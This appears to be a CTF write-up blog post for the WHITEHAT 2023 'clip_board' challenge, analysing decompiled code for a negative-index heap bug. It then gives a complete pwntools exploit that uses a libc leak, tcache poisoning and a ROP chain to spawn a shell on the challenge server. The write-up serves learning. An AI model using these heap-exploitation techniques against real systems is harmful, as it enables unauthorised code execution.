---
layout: post
title: "[WHITEHAT 2023] clip_board"
comments: true
category: ctf
---

## Analysis source code

- main

```cpp
int __fastcall main(int argc, const char **argv, const char **envp)
{
  void *v3; // rax
  int v4; // eax
  char v6; // [rsp+Fh] [rbp-1h]

  v6 = 0;
  Setup();
  v3 = malloc(0x20uLL);
  printf("heap leak: %p\n\n", v3);
  do
  {
    Menu();
    v4 = get_int();
    if ( v4 == 4 )
    {
      v6 = 1;
    }
    else if ( v4 <= 4 )
    {
      switch ( v4 )
      {
        case 3:
          ViewClipboard();
          break;
        case 1:
          AddClipboard();
          break;
        case 2:
          DelClipboard();
          break;
      }
    }
  }
  while ( !v6 );
  return 0;
}
```
The main function provides us with a heap address. <br />
It also receives input via the get_int() function and executes other functions until the input is 4. <br />
<br />

- get_int

```cpp
int get_int()
{
  int v1; // [rsp+Ch] [rbp-34h]
  char s[40]; // [rsp+10h] [rbp-30h] BYREF
  unsigned __int64 v3; // [rsp+38h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  memset(s, 0, 0x20uLL);
  v1 = read(0, s, 0x14uLL);
  if ( v1 == -1 )
    return -1;
  if ( s[v1 - 1] == 10 )
    s[v1 - 1] = 0;
  return atoi(s);
}
```
The get_int function reads 20 bytes. If it contains a '\n' at the end, it changes it to a null byte. <br />
After that, returns atoi of input. <br />
<br />

- get_input

```cpp
ssize_t __fastcall get_input(unsigned __int8 *a1, int a2)
{
  ssize_t _rax; // rax
  int v3; // [rsp+1Ch] [rbp-4h]

  _rax = read(0, a1, a2);
  v3 = _rax;
  if ( (_DWORD)_rax != -1 )
  {
    _rax = a1[(int)_rax - 1];
    if ( (_BYTE)_rax == 10 )
    {
      _rax = (ssize_t)&a1[v3 - 1];
      *(_BYTE *)_rax = 0;
    }
  }
  return _rax;
}
```
get_input function reads from stdin, and write it to buf a1, size is a2. <br />
Similar to the get_int function, if the last byte of input is '\n', it changes it to a null byte. <br />
<br />

- AddClipboard

```cpp
int AddClipboard()
{
  void *_rax; // rax
  int v2; // [rsp+0h] [rbp-10h]
  unsigned int v3; // [rsp+4h] [rbp-Ch]
  void *v4; // [rsp+8h] [rbp-8h]

  printf("index > ");
  LODWORD(_rax) = get_int();
  v2 = (int)_rax;
  if ( (int)_rax <= 9 )
  {
    LODWORD(_rax) = check_chunk_list_4090[(int)_rax];
    if ( !(_BYTE)_rax )
    {
      printf("size > ");
      LODWORD(_rax) = get_int();
      v3 = (unsigned int)_rax;
      if ( (int)_rax <= 256 )
      {
        _rax = malloc((int)_rax);
        v4 = _rax;
        if ( _rax )
        {
          printf("contents > ");
          get_input(v4, v3);
          check_chunk_list_4090[v2] = 1;
          chunk_size_list_40a0[v2] = v3;
          LODWORD(_rax) = (_DWORD)v4;
          chunk_list_4040[v2] = v4;
        }
      }
    }
  }
  return (int)_rax;
}
```
First, it receives input by get_int function. It oprerates only when input is lower then 10. <br />
Here, we can find a vulnerability. If the input is a negative number, it can pass the conditional statement. <br />
After that, it receives size. If must lower or equal than 0x100. <br />
Allocate space at heap by malloc(), read contents, and write it to space. <br />
This program distinguishes whether the clipboard is written or not by check_list.(0x4090, global variable) <br />
There is also size_list(0x40a0, global variable), and chunk_list(0x4040, global variable). <br />
<br />

- DelClipboard

```cpp
int DelClipboard()
{
  _DWORD *_rax; // rax
  int v2; // [rsp+4h] [rbp-Ch]

  printf("index > ");
  LODWORD(_rax) = get_int();
  v2 = (int)_rax;
  if ( (int)_rax <= 9 )
  {
    LODWORD(_rax) = check_chunk_list_4090[(int)_rax];
    if ( (_BYTE)_rax )
    {
      _rax = (_DWORD *)chunk_list_4040[v2];
      if ( _rax )
      {
        free(_rax);
        chunk_list_4040[v2] = 0LL;
        check_chunk_list_4090[v2] = 0;
        _rax = chunk_size_list_40a0;
        chunk_size_list_40a0[v2] = 0;
      }
    }
  }
  return (int)_rax;
}
```
DelClipboard receives index which want to delete. If it doesn't exists, then it doesn't work. <br />
It checks clipboard exists or not by check_list value is '\x00' or not. <br />
Even if it is neither '\x00' nor '\x01', this function works. <br />
Free heap space, delete chunk_list, check_list, and size_list. <br />
<br />

- ViewClipboard

```cpp
int ViewClipboard()
{
  int result; // eax
  int v1; // [rsp+0h] [rbp-10h]
  void *buf; // [rsp+8h] [rbp-8h]

  printf("index > ");
  result = get_int();
  v1 = result;
  if ( result <= 9 )
  {
    result = check_chunk_list_4090[result];
    if ( (_BYTE)result )
    {
      buf = (void *)chunk_list_4040[v1];
      result = chunk_size_list_40a0[v1];
      if ( buf )
      {
        if ( result <= 256 )
          return write(1, buf, result);
      }
    }
  }
  return result;
}
```
ViewClipboard just receives index and display that clipboard. <br />
If we insert negative index, but size is not in range, we can't display it. <br />
<br />

## Analyze & Exploit
<br />

There's no function for modifying data. Only creating or erasing is possible. <br />
First, let's see if we can get some address is possible. <br />
<br />

### get libc_address
- This binary runs with libc-2.35.
- If we make clip_board and delete it, a tcache chunk is created.
- But if we free same size of chunk more than 7, it goes to fastbin or unsortedbin.
- If there is unsortedbin chunk(A), and we allocate lower size of chunk(B) of that, the chunk is divided into two chunk(B and C). One is allocate(B), and the other(C) will left at unsortedbin.
- When allocate chunk(B), fd and bk of unsortedbin are still remains. If we print out it by ViewClipboard(), we can get libc_address. Becuase fd and bk is main_arena's address.
<br />

```python
#make unsortedbin chunk
for i in range(8):
    add_clip(i, 0x90, b'A')

for i in range(8):
    del_clip(7-i)

#get libc_addr from fd, bk of unsortedbin
for i in range(7):
    add_clip(i, 0x90, b'A')

add_clip(7, 0x50, b'H')

view_clip(7)
r.recvn(8)
libc_base = u64(r.recvn(6) + b'\x00'*2) - 0x21ac80 - 240
print(hex(libc_base))
```
<br />

### Using negative index
- We can't do anything with simple add or delete clip.
- At bss, global variable's order is addr_list, check_list, size_list.
- If we input a negative index, size can be written to check_list or addr_list, and check can be written to addr_list.
- If we input -7, size is written to addr_list[8], check is decided by addr_list[9]'s 0xff00 byte. Address is written at dso_handle, and it is not that important.
- Changing add_list[9]'s value is very sensitive. Control that more effeciently, heap's address must be end with 0xf000. Program prints heap's address when to start, so we can decide very fast.
- After that, we can make next chunk's address is end with 0x0000 by allocate lots of chunk and free it.
<br />

```python
#setting chunk's addr like 0x0000
for i in range(7):
    add_clip(i, 0x50, b'A')

for i in range(7):
    del_clip(6-i)

for i in range(7):
    add_clip(i, 0x40, b'A')

for i in range(7):
    del_clip(6-i)

for i in range(7):
    add_clip(i, 0x30, b'A')

for i in range(7):
    del_clip(i)

add_clip(0, 0x70, b'A')
add_clip(1, 0x70, b'A')
add_clip(2, 0x70, b'A')
add_clip(3, 0x70, b'A')
add_clip(4, 0x10, b'A')
add_clip(5, 0x10, b'A')

for i in range(6):
    del_clip(5-i)
```
<br />

### Get stack address
- To read or write what we want, we have to modify the tcachebin chunk's fd value.
- After add 9's clip which address is end with 0x000, we can add -7's clip. Then address of 9's clip is end with 0x0100.
- If we write contents appropritately, we can make fake chunk which address is end with 0x0100.
- Finally we can control free chunk's fd.
- We just have to be careful with the number of chunks in the tcache bin. Also, be careful to XOR the tcache_key with the fd value.
- stack's address is written on <__libc_argv>
<br />

```python
#get main's rbp addr
add_clip(9, 0x80, b'A')
add_clip(0, 0x80, b'A'*0x68 + b'\x11\x01')
add_clip(1, 0x80, b'A')
add_clip(2, 0x80, b'A')
add_clip(3, 0x100, b'A')
add_clip(-7, 0x10, b'A')
del_clip(3)
del_clip(9)
del_clip(0)
add_clip(0, 0x80, b'A'*0x68 + b'\x11\x01'+b'\x00'*6 + p64(((heap_base + 0x1000)>>12)^(libc_base+0x21ba10)))
add_clip(3, 0x100, b'A'*0x10)
add_clip(4, 0x100, b'A'*0x10)
view_clip(4)
r.recvuntil(b'A'*0x10)
rbp_addr = u64(r.recvn(6) + b'\x00'*2) - 0x118
print(hex(rbp_addr))
```
<br />

### Write to rbp for ROP
- If we use chunk's which address is end with 0x00?0 or 0x01?0, we can allocate chunk to stack.
- Overwrite main's return_address, and do ROP.
- Be careful of stack's address alignment.
<br />

``` python
#overwrite rbp
del_clip(0)
add_clip(9, 0x80, b'A')
add_clip(-7, 0x10, b'A')
add_clip(5, 0x100, b'A')
del_clip(1)
add_clip(1, 0x80, b'A'*0x68 + b'\x11\x01')
del_clip(5)
del_clip(9)
del_clip(1)
add_clip(1, 0x80, b'A'*0x68 + b'\x11\x01'+b'\x00'*6 + p64(((heap_base + 0x1000)>>12)^(rbp_addr)))
add_clip(0, 0x100, b'/bin/sh\x00')
pop_rdi = libc_base + 0x2a3e5
binsh = heap_base + 0x1190
system = libc_base + 0x50d70
ret = libc_base + 0x29139
add_clip(5, 0x100, b'A'*0x8 + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system))
```

<br />

## Ex code

```python
from pwn import *

context.log_level = 'debug'

def add_clip(idx, size, content):
    r.sendafter(b'> ', b'1')
    r.sendafter(b'index > ', str(idx).encode())
    r.sendafter(b'size > ', str(size).encode())
    r.sendafter(b'contents > ', content)

def del_clip(idx):
    r.sendafter(b'> ', b'2')
    r.sendafter(b'index > ', str(idx).encode())

def view_clip(idx):
    r.sendafter(b'> ', b'3')
    r.sendafter(b'index > ', str(idx).encode())


while 1:
    r = remote('192.168.0.3', 8794)
    r.recvuntil(b'leak: ')
    heap_base = int(r.recv(14), 16) & 0xfffffffff000
    chk = (heap_base & 0xf000)
    if chk == 0xf000:
        break
    r.close()
print(hex(heap_base))

#make unsortedbin chunk
for i in range(8):
    add_clip(i, 0x90, b'A')

for i in range(8):
    del_clip(7-i)

#get libc_addr from fd, bk of unsortedbin
for i in range(7):
    add_clip(i, 0x90, b'A')

add_clip(7, 0x50, b'H')

view_clip(7)
r.recvn(8)
libc_base = u64(r.recvn(6) + b'\x00'*2) - 0x21ac80 - 240
print(hex(libc_base))

#reset clip
for i in range(8):
    del_clip(7-i)

#setting chunk's addr like 0x0000
for i in range(7):
    add_clip(i, 0x50, b'A')

for i in range(7):
    del_clip(6-i)

for i in range(7):
    add_clip(i, 0x40, b'A')

for i in range(7):
    del_clip(6-i)

for i in range(7):
    add_clip(i, 0x30, b'A')

for i in range(7):
    del_clip(i)

add_clip(0, 0x70, b'A')
add_clip(1, 0x70, b'A')
add_clip(2, 0x70, b'A')
add_clip(3, 0x70, b'A')
add_clip(4, 0x10, b'A')
add_clip(5, 0x10, b'A')

for i in range(6):
    del_clip(5-i)

#get main's rbp addr
add_clip(9, 0x80, b'A')
add_clip(0, 0x80, b'A'*0x68 + b'\x11\x01')
add_clip(1, 0x80, b'A')
add_clip(2, 0x80, b'A')
add_clip(3, 0x100, b'A')
add_clip(-7, 0x10, b'A')
del_clip(3)
del_clip(9)
del_clip(0)
add_clip(0, 0x80, b'A'*0x68 + b'\x11\x01'+b'\x00'*6 + p64(((heap_base + 0x1000)>>12)^(libc_base+0x21ba10)))
add_clip(3, 0x100, b'A'*0x10)
add_clip(4, 0x100, b'A'*0x10)
view_clip(4)
r.recvuntil(b'A'*0x10)
rbp_addr = u64(r.recvn(6) + b'\x00'*2) - 0x118
print(hex(rbp_addr))

#overwrite rbp
del_clip(0)
add_clip(9, 0x80, b'A')
add_clip(-7, 0x10, b'A')
add_clip(5, 0x100, b'A')
del_clip(1)
add_clip(1, 0x80, b'A'*0x68 + b'\x11\x01')
del_clip(5)
del_clip(9)
del_clip(1)
add_clip(1, 0x80, b'A'*0x68 + b'\x11\x01'+b'\x00'*6 + p64(((heap_base + 0x1000)>>12)^(rbp_addr)))
add_clip(0, 0x100, b'/bin/sh\x00')
pop_rdi = libc_base + 0x2a3e5
binsh = heap_base + 0x1190
system = libc_base + 0x50d70
ret = libc_base + 0x29139
add_clip(5, 0x100, b'A'*0x8 + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system))

# do return 0
r.sendafter(b'> ', b'4')

r.interactive()
```